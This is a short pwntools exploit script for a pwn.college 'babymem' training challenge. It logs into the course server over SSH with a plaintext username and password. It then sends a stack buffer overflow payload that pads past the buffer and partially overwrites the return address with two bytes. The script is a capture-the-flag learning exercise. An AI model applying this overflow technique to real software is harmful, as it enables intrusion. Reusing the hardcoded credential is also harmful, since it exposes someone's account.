from pwn import *
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../csec")

context.log_level = 'debug'
p = s.process("./babymem_level8_teaching1")
# p = process('./babymem_level7_testing1')

p.sendlineafter(b'Payload size: ',b'1000')
pay = b'A'*10 + b'\x00'
pay = pay.ljust(0x88,b'B')
pay += p16(0xf4D5)
# pause()
p.sendafter(b'bytes)!\n',pay)
p.interactive()